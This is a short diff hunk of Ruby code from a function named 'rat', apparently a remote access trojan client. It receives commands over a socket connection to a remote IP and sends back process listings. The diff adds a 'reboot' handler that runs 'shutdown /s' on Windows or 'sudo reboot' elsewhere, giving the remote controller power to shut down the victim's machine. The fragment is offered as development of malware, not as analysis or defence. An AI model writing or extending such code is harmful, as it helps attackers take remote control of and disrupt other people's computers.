@@ -95,6 +95,12 @@ def rat(ip)
           socket.puts `ps aux`
         end
         socket.puts 'done'
+      when 'reboot'
+        if Gem.win_platform?
+          exec 'shutdown /s'
+        else
+          exec 'sudo reboot'
+        end
       end
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
